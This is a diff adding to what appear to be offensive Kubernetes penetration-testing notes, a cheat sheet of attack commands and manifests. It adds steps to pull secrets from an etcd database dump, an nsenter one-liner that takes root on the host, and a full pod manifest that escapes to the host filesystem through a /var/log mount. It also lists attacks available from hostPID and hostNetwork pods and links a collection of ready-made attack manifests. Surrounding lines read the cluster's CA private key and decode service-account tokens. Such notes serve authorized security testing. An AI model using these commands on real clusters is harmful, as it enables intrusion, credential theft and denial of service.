@@ -31,7 +31,7 @@ etcd (no authentication)
 Kubernetes Dashboard (no authentication)
 	kubectl --token="<JWT_token>" -s https://<target_IP>:6443 --insecure-skip-tls-verify -n kube-system exec kube-apiserver-<cluster_name>-control-plane cat /etc/kubernetes/pki/ca.key
 
-Access to cluserrole-aggregation-controller-token-... secret
+Access to cluserrole-aggregation-controller secret
 		kubectl -n kube-system get secret clusterrole-aggregation-controller-token-... -o json
 
 		get "token" field from secret and b64 decode it to get JWT token
@@ -55,6 +55,22 @@ Access to cluserrole-aggregation-controller-token-... secret
 		kubectl --token=$TOKEN get pods
 
 		kubectl --token=$TOKEN -n kube-system exec kube-apiserver-sshgs-control-plane cat /etc/kubernetes/pki/ca.key
+
+
+
+Get secrets from etcd 
+	includes config for whole cluster, including all secrets
+
+	run exploit pod on a control-plane node
+		include the nodeName selector in the pod spec
+			
+			spec:
+		    nodeName: foo-node # schedule pod to specific node
+
+
+Find secrets with access to etcd database (or backup)
+		strings db | grep -B 4 Opaque
+		strings db | grep -B 1 -A 1 "service-account-token"
 
 
 
@@ -161,6 +177,9 @@ spec:
 
 		cat /etc/kubernetes/pki/ca.key
 
+		**Escalate to root on host**
+			kubectl exec -it r00t -- nsenter -a -t 1 bash
+
 
 	Root on node if you have pod creation rights and pod exec rights #2
 	
@@ -225,6 +244,34 @@ spec:
 		
 		cat /rooted/etc/kubernetes/pki/ca.key
 
+
+	Root on node if you have pod exec rights for pod running as root and /var/log is mounted on pod
+
+		vi escaper.yml
+
+apiVersion: v1
+kind: Pod
+metadata: 
+  name: escaper
+spec:
+  containers:
+  - name: escaper
+    image: danielsagi/kube-pod-escape
+    volumeMounts:
+    - name: logs
+      mountPath: /var/log/host
+  volumes:
+  - name: logs
+    hostPath:
+      path: /var/log
+      type: Directory
+
+      kubectl create -f escaper.yml
+      kubectl exec -it escaper bash
+
+      uses two custom commands running from within the pod
+				lsh ==  ls (on the host fs) 
+				cath == cat (on the host fs)
 
 	
 	Root on all nodes (incl master nodes) if you have create daemonset rights and pod exec rights
@@ -322,7 +369,26 @@ If you have pod creation rights, but no Internet access to pull a new image
 		see noderoot.yml above
 	Create the pod and exec into it
 
-		
+
+If you are in a pod running with `hostPID: true`
+	can see all processes running on host (ps)
+	can kill any process on the node (DoS)
+
+
+If you are in a pod running with `hostNetwork: true`
+	can use tcpdump to sniff unencrypted traffic on the host
+	can access services bound to localhost's loopback interface
+	can access services otherwise blocked by network policies
+
+
+ready-to-use manifests for different permissions/resources/directions
+	https://github.com/BishopFox/badPods
+
+
+
+
+
+
 
 port-forwarding
 	get direct access to a pod's services from a local machine
